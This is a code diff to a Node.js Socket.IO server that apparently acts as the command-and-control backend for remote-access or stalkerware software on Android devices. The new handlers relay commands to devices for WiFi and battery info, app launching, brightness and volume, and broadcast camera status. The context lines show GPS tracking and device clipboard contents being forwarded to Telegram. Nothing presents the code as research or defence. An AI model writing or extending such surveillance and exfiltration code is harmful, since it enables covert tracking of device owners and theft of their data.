@@ -191,6 +191,22 @@ io.on('connection', (socket) => {
     }
   });
 
+  // Camera error from device
+  socket.on('camera:error', (data) => {
+    socket.broadcast.emit('camera:error', {
+      deviceId: socket.deviceId,
+      error: data.error
+    });
+  });
+
+  // Camera status from device
+  socket.on('camera:status', (data) => {
+    socket.broadcast.emit('camera:status', {
+      deviceId: socket.deviceId,
+      status: data.status
+    });
+  });
+
   // Dashboard requests GPS from device
   socket.on('command:gps:start', ({ deviceId }) => {
     const targetSocketId = deviceSockets.get(deviceId);
@@ -511,6 +527,55 @@ io.on('connection', (socket) => {
     });
     // Forward to Telegram
     sendToTelegram(() => telegram.sendMessage(telegram.formatClipboard(data)));
+  });
+
+  // WiFi Info
+  socket.on('command:wifi:info', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:wifi:info');
+    }
+  });
+  socket.on('wifi:info', (data) => {
+    socket.broadcast.emit('wifi:info', { deviceId: socket.deviceId, ...data });
+  });
+
+  // Battery Info
+  socket.on('command:battery:info', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:battery:info');
+    }
+  });
+  socket.on('battery:info', (data) => {
+    socket.broadcast.emit('battery:info', { deviceId: socket.deviceId, ...data });
+  });
+
+  // App Launch
+  socket.on('command:app:launch', ({ deviceId, packageName }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:app:launch', { packageName });
+    }
+  });
+  socket.on('app:launched', (data) => {
+    socket.broadcast.emit('app:launched', { deviceId: socket.deviceId, ...data });
+  });
+
+  // Brightness
+  socket.on('command:brightness:set', ({ deviceId, level }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:brightness:set', { level });
+    }
+  });
+
+  // Volume
+  socket.on('command:volume:set', ({ deviceId, level, type }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:volume:set', { level, type: type || 'music' });
+    }
   });
 
   // ---- New Feature Commands ----
